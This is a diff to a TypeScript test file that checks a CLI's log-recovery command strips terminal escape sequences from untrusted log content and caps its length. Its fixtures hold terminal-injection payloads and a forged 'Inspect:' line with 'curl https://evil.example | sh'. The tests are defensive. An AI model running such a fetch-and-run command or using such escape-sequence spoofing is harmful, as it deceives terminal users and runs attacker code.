@@ -117,6 +117,38 @@ async function runArchive(): Promise<number> {
   }
 }
 
+/**
+ * Characters that steer a terminal: C0 controls other than the newline that
+ * ends each printed line, DEL, C1 controls, and the bidirectional overrides
+ * and isolates that reorder what is shown.
+ */
+function terminalControls(text: string): string[] {
+  return Array.from(text).filter(c => {
+    const cp = c.codePointAt(0) ?? 0;
+    return (cp < 0x20 && cp !== 0x0a)
+      || (cp >= 0x7f && cp <= 0x9f)
+      || (cp >= 0x202a && cp <= 0x202e)
+      || (cp >= 0x2066 && cp <= 0x2069);
+  });
+}
+
+/**
+ * A read error that quotes a hostile log line: a clear-screen and an OSC 8
+ * link, a CR LF that starts a forged "Inspect:" line, a bell, a C1 CSI, a
+ * right-to-left override, a NUL, and 5,000 characters of filler.
+ */
+const HOSTILE_READ_ERROR =
+  'Unexpected token in "\u001b[2J\u001b[H\u001b]8;;https://evil.example\u0007update\u001b]8;;\u0007' +
+  '\r\n  Inspect:  curl https://evil.example | sh\u0007\u009b31m‮gnp.exe\u0000' +
+  'A'.repeat(5000) + '"';
+
+/** HOSTILE_READ_ERROR as recover prints it: one line, controls removed, cut at 300 characters. */
+const HOSTILE_READ_ERROR_FLAT =
+  'Unexpected token in "[2J[H]8;;https://evil.exampleupdate]8;;   Inspect:  curl https://evil.example | sh31mgnp.exe' +
+  'A'.repeat(5000) + '"';
+const PRINTED_HOSTILE_READ_ERROR =
+  `${HOSTILE_READ_ERROR_FLAT.slice(0, 300)}... (${HOSTILE_READ_ERROR_FLAT.length - 300} more characters not shown)`;
+
 describe('shield recover --archive-log', () => {
   it('archives a broken log, anchors its digest, and clears SHIELD-INT-002', async () => {
     getShieldDir();
@@ -286,5 +318,90 @@ describe('shield recover --archive-log', () => {
     expect(text).toContain(`Reason:   Not a regular file: ${getEventsPath()}`);
     expect(text).toContain('Inspect:  opena2a shield selfcheck');
     expect(text).not.toContain('intact');
+  });
+
+  // The read error can quote the log it was raised on, and the log is
+  // untrusted: it is printed as one capped line with nothing in it that
+  // steers a terminal, and the line it tries to forge stays inert text.
+  it('prints a hostile read error as one capped line with no control characters', async () => {
+    getShieldDir();
+    writeEvent(makePartial({ action: 'genuine-1' }));
+    vi.mocked(verifyEventLog).mockImplementationOnce(() => {
+      throw new Error(HOSTILE_READ_ERROR);
+    });
+
+    const errors: string[] = [];
+    const err = vi.spyOn(process.stderr, 'write').mockImplementation((chunk: unknown) => {
+      errors.push(String(chunk));
+      return true;
+    });
+    const out = vi.spyOn(process.stdout, 'write').mockReturnValue(true);
+    const code = await shield({ subcommand: 'recover', archiveLog: true });
+    err.mockRestore();
+    out.mockRestore();
+
+    expect(code).toBe(1);
+    const text = errors.join('');
+    expect(terminalControls(text)).toEqual([]);
+    const lines = text.split('\n');
+    expect(lines.filter(l => l.startsWith('  Reason:'))).toEqual([`  Reason:   ${PRINTED_HOSTILE_READ_ERROR}`]);
+    expect(lines.filter(l => l.startsWith('  Inspect:'))).toEqual(['  Inspect:  opena2a shield selfcheck']);
+    expect(archives()).toEqual([]);
+  });
+
+  it('reports the same one-line, capped read error in json mode', async () => {
+    getShieldDir();
+    writeEvent(makePartial({ action: 'genuine-1' }));
+    vi.mocked(verifyEventLog).mockImplementationOnce(() => {
+      throw new Error(HOSTILE_READ_ERROR);
+    });
+
+    const chunks: string[] = [];
+    const out = vi.spyOn(process.stdout, 'write').mockImplementation((chunk: unknown) => {
+      chunks.push(String(chunk));
+      return true;
+    });
+    const code = await shield({ subcommand: 'recover', archiveLog: true, format: 'json' });
+    out.mockRestore();
+
+    expect(code).toBe(1);
+    const payload = JSON.parse(chunks.join(''));
+    expect(payload.status).toBe('unreadable');
+    expect(payload.error).toBe(PRINTED_HOSTILE_READ_ERROR);
+  });
+
+  // End to end, with nothing mocked: a log whose lines carry escape
+  // sequences, one of them 100,000 characters long, is checked and archived,
+  // and none of its content reaches the terminal.
+  it('archives a log holding hostile and overlong lines without printing any of their content', async () => {
+    getShieldDir();
+    writeEvent(makePartial({ action: 'genuine-1' }));
+    fs.appendFileSync(
+      getEventsPath(),
+      '\u001b[2J\u001b]8;;https://evil.example\u0007click\u001b]8;;\u0007' + 'B'.repeat(100_000) + '\n',
+      'utf-8',
+    );
+    appendForgedEvent('\u001b[31mforged\u0007');
+
+    const written: string[] = [];
+    const out = vi.spyOn(process.stdout, 'write').mockImplementation((chunk: unknown) => {
+      written.push(String(chunk));
+      return true;
+    });
+    const err = vi.spyOn(process.stderr, 'write').mockImplementation((chunk: unknown) => {
+      written.push(String(chunk));
+      return true;
+    });
+    const code = await shield({ subcommand: 'recover', archiveLog: true });
+    out.mockRestore();
+    err.mockRestore();
+
+    expect(code).toBe(0);
+    expect(archives().length).toBe(1);
+    const text = written.join('');
+    expect(text).toContain('Broken event log archived.');
+    expect(terminalControls(text)).toEqual([]);
+    expect(text).not.toContain('evil.example');
+    expect(text).not.toContain('BBBB');
   });
 });
